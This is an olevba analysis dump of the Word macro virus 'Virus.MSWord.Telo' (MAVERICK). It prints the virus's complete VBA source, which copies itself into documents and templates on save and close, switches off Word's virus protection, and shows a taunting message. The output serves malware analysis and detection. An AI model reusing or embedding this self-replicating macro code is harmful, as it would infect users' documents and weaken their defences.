olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Telo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Telo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MAVERICK.bas 
in file: Virus.MSWord.Telo - OLE stream: 'Macros/VBA/MAVERICK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
Attribute FileClose.VB_Description = "Ìàêðîñ çàïèñàí 19.10.98 Ñàíäðèãàéëî Ðîìàí Ãåííàäüåâè÷\r\nïðîáà ñîçäàíèÿ âèðóñà"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FilePrintDefault"
    On Error Resume Next
Application.OrganizerCopy _
    Source:=ActiveDocument.AttachedTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="MAVERICK", _
    Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy _
    Source:=ActiveDocument.FullName, _
    Destination:=ActiveDocument.AttachedTemplate.FullName, _
    Name:="MAVERICK", _
    Object:=wdOrganizerObjectProjectItems
    
    ActiveDocument.Close
    Application.Run MacroName:="telo_virusa"
End Sub
Sub FileSave()
    On Error Resume Next
Application.OrganizerCopy _
    Source:=ActiveDocument.AttachedTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="MAVERICK", _
    Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy _
    Source:=ActiveDocument.FullName, _
    Destination:=ActiveDocument.AttachedTemplate.FullName, _
    Name:="MAVERICK", _
    Object:=wdOrganizerObjectProjectItems
    
    Application.Run MacroName:="telo_virusa"
    ActiveDocument.Save
End Sub
Sub telo_virusa()
    With Options
        .VirusProtection = False
    End With
    A = Now()
    CHISLO = Day(A)
    MESACH = Month(A)
    GOD = Year(A)
    w = Abs((CHISLO >= 2) * (MESACH = 12) * (GOD = 1998)) + Abs((MESACH > 0) * (GOD > 1998))
    Q = Int(Rnd * (100))
    If (Q = 2) * (w = 1) = 0 Then GoTo NOVIRUS
    MsgBox "Ó ìåíÿ ñåãîäíÿ âèðóñ," & Chr(10) & "Âñ¸ â çàðàçå òóò è òàì," & Chr(10) & "Î÷åíü õèòðûé ýòîò âèñóñ," & Chr(10) & "ß åãî ñîñòàâèë ñàì!" & Chr(10) & Chr(10) & "                             Ðîìàí", 0, "         MAVERICK"
NOVIRUS:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

